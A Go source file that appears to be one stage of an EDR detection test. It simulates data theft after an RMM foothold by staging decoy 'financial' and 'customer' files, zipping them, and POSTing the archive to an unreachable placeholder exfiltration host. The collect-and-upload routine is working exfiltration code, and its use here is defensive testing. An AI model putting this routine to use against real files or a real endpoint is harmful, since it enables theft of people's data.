//go:build windows
// +build windows

/*
STAGE 3: Follow-on Exfiltration to Cloud Storage (T1567.002)

Simulates the operator using the ScreenConnect RMM foothold to collect data and
exfiltrate it — the way unsanctioned-RMM abuse actually ends (data theft /
ransomware staging). Decoy data is staged in ARTIFACT_DIR (`c:\Users\fortika-test`,
NOT whitelisted, so EDR can observe the file operations), collected into an archive
in LOG_DIR, then an outbound upload is attempted to a BENIGN / unreachable cloud
endpoint to generate egress telemetry.

Exit-code discipline (CLAUDE.md Bug Prevention Rules 5 & 8):
  - Archive quarantine (written+verified, then gone) => StageQuarantined (105).
  - The upload attempt FAILING against the unreachable benign endpoint is EXPECTED
    and benign — it is NOT an EDR block and never yields a block code.
  - Any other benign/ambiguous failure => StageError (999).
*/

package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

const (
	TEST_UUID      = "208ef54b-06bc-4610-87b6-520aea57517e"
	TECHNIQUE_ID   = "T1567.002"
	TECHNIQUE_NAME = "Exfiltration to Cloud Storage"
	STAGE_ID       = 3

	// Benign, UNREACHABLE exfil endpoint (RFC 2606 `.invalid` — never resolves).
	// No real cloud bucket / credential is used or committed.
	EXFIL_URL = "https://exfil-placeholder.invalid/upload"
)

// Standardized stage exit codes.
const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting follow-on collection + exfiltration over the RMM foothold")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Collect decoy data from ARTIFACT_DIR and attempt exfiltration")

	// Step 1: stage decoy data in ARTIFACT_DIR (collection source).
	collectionDir := filepath.Join(ARTIFACT_DIR, "shared_finance_export")
	if err := stageDecoyData(collectionDir); err != nil {
		msg := fmt.Sprintf("failed to stage decoy data in %s: %v", collectionDir, err)
		fmt.Printf("[STAGE %s] ERROR (not a block): %s\n", TECHNIQUE_ID, msg)
		LogMessage("ERROR", TECHNIQUE_ID, msg)
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", msg)
		os.Exit(StageError)
	}

	// Step 2: collect into an archive in LOG_DIR (+ quarantine check).
	archivePath := filepath.Join(LOG_DIR, "collected_export.zip")
	if code, msg := collectArchive(collectionDir, archivePath); code != StageSuccess {
		if code == StageQuarantined {
			fmt.Printf("[STAGE %s] PROTECTED: %s\n", TECHNIQUE_ID, msg)
		} else {
			fmt.Printf("[STAGE %s] ERROR (not a block): %s\n", TECHNIQUE_ID, msg)
			LogMessage("ERROR", TECHNIQUE_ID, msg)
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", msg)
		}
		os.Exit(code)
	}

	// Step 3: attempt exfil (upload) to the benign endpoint (egress telemetry).
	attemptExfil(archivePath)

	LogMessage("SUCCESS", TECHNIQUE_ID, "Collection and exfiltration attempt completed")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Decoy data collected and exfiltration attempted over RMM foothold")
	os.Exit(StageSuccess)
}

// stageDecoyData writes obviously-synthetic decoy files into ARTIFACT_DIR.
// ARTIFACT_DIR is provisioned by the deploy step; we create the subdir + files
// so the stage is self-contained and the file writes are observable by EDR.
func stageDecoyData(dir string) error {
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("mkdir: %v", err)
	}

	// Synthetic, non-sensitive decoy content (clearly fake — no real secrets).
	decoys := map[string]string{
		"q3_financials_DECOY.csv":  "DECOY DATA - NOT REAL\nAccount,Quarter,Amount\nDECOY-001,Q3,0.00\nDECOY-002,Q3,0.00\n",
		"customer_list_DECOY.csv":  "DECOY DATA - NOT REAL\nCustomerID,Name,Region\nDECOY-1001,Example Customer,TEST\n",
		"vpn_notes_DECOY.txt":      "DECOY DATA - NOT REAL\nThis file is a synthetic decoy used by a F0RT1KA detection test.\n",
		"board_minutes_DECOY.txt":  "DECOY DATA - NOT REAL\nSynthetic board minutes placeholder. No real content.\n",
	}

	total := 0
	for name, content := range decoys {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, []byte(content), 0644); err != nil {
			return fmt.Errorf("write %s: %v", name, err)
		}
		LogFileDropped(name, p, int64(len(content)), false)
		total++
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Staged %d decoy files in %s", total, dir))
	return nil
}

// collectArchive zips the collection directory into archivePath, then verifies
// the archive survived (positive-evidence quarantine check).
func collectArchive(sourceDir, archivePath string) (int, string) {
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Collecting %s into %s", sourceDir, archivePath))

	zipFile, err := os.Create(archivePath)
	if err != nil {
		return StageError, fmt.Sprintf("failed to create archive %s: %v", archivePath, err)
	}
	zw := zip.NewWriter(zipFile)

	walkErr := filepath.Walk(sourceDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		rel, err := filepath.Rel(sourceDir, path)
		if err != nil {
			return err
		}
		w, err := zw.Create(rel)
		if err != nil {
			return err
		}
		f, err := os.Open(path)
		if err != nil {
			return err
		}
		defer f.Close()
		_, err = io.Copy(w, f)
		return err
	})

	zw.Close()
	zipFile.Close()

	if walkErr != nil {
		return StageError, fmt.Sprintf("collection failed: %v", walkErr)
	}

	// Positive-evidence quarantine check.
	time.Sleep(3 * time.Second)
	if _, err := os.Stat(archivePath); os.IsNotExist(err) {
		LogMessage("BLOCKED", TECHNIQUE_ID, "collected archive quarantined after creation (written, verified gone)")
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "collected archive quarantined after creation")
		return StageQuarantined, "collected archive quarantined after creation"
	}

	info, _ := os.Stat(archivePath)
	LogFileDropped(filepath.Base(archivePath), archivePath, sizeOf(info), false)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Archive created: %s", archivePath))
	return StageSuccess, ""
}

// attemptExfil uploads the archive to the benign/unreachable endpoint.
// Failure against the unreachable placeholder is EXPECTED and benign (Rule 8).
func attemptExfil(archivePath string) {
	data, err := os.ReadFile(archivePath)
	if err != nil {
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("could not read archive for exfil: %v", err))
		return
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Attempting exfil of %d bytes to %s (egress telemetry)", len(data), EXFIL_URL))
	client := &http.Client{Timeout: 8 * time.Second}
	resp, err := client.Post(EXFIL_URL, "application/zip", bytes.NewReader(data))
	if err != nil {
		// Unreachable benign endpoint — expected. NOT an EDR block.
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Exfil upload did not complete (expected for unreachable placeholder): %v", err))
		return
	}
	defer resp.Body.Close()
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Exfil endpoint responded HTTP %d", resp.StatusCode))
}

func sizeOf(info os.FileInfo) int64 {
	if info == nil {
		return 0
	}
	return info.Size()
}
